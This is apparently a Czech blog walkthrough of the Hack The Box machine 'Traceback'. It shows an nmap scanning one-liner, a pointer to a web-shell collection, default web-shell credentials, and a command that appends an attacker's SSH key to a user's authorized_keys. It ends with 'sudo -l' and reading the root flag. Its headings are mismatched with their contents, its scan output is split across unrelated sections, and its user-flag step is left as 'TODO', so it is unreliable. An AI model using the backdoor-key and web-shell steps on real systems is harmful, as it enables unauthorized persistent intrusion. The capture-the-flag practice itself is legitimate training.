---
layout: post
author: Tomáš Matějíček
title: "Traceback"
date: 2021-01-26
tags: linux rce ssh sudo php exploit
---
[Traceback](https://www.hackthebox.eu/home/machines/profile/233) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT   STATE SERVICE VERSION
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
```
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`HTML Source Code`
```
=> Some of the best web shells that you might need
=> https://github.com/TheBinitGhimire/Web-Shells
```

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`http://10.10.10.181/smevk.php`
```
=> admin:admin
echo "ssh-rsa __CENSORED__== hack@t" >> /home/webadmin/.ssh/authorized_keys
```

### Průzkum možností eskalace
Hledám chybné konfigurace a cesty k vyšším oprávněním.
`sudo -l`
```
=>     (sysadmin) NOPASSWD: __CENSORED__
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```

### Získání user flagu
`TODO`
